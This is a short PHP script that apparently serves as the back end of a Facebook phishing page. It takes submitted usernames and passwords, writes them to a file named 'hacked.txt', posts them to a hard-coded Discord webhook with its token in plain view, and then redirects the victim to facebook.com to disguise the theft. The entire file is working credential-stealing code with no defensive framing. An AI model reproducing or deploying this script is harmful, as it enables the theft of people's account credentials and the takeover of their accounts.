<?php

if ($_SERVER['REQUEST_METHOD'] == 'POST'){
    $username = isset($_POST['username']) ? $_POST['username'] :'';
    $password = isset($_POST['password']) ? $_POST['password'] :'';

    echo $username;
    echo $password;

    file_put_contents('hacked.txt', "USERNAME=$username, PASSWORD=$password", FILE_APPEND);

    $webhook_url = 'https://discord.com/api/webhooks/1215446696813920307/twJRdKFL3EngVPsrw1G59G7CbNwS75-Z5XSlz_sQvgO51znxjmCQg66XjP-KSoQ8-YXO';

    $msg = ["content" => "USERNAME: $username PASSWORD:$password" ];
  
    $headers = array('Content-Type: application/json'); 
  
    $ch = curl_init();
    curl_setopt( $ch,CURLOPT_URL, $webhook_url );
    curl_setopt( $ch,CURLOPT_POST, true );
    curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
    curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
    curl_setopt( $ch,CURLOPT_SSL_VERIFYPEER, false );
    curl_setopt( $ch,CURLOPT_POSTFIELDS, json_encode( $msg ) );
    $response = curl_exec( $ch );
    curl_close( $ch );
  
    echo $response;
    header("Location:https://www.facebook.com/?stype=lo&deoia=1&jlou=Aff5YrWATnYqUm8Bxz5uVkfxsIP-FCpas02MyLVc501FINXEymIKxzkm54QyHf9H_greX1WODtSWcCXN8X93fBIPUqpsS4dnQJDzEFfP2cFCFg&smuh=33011&lh=Ac_NRnA4rlhZSK3hcHw");
}




?>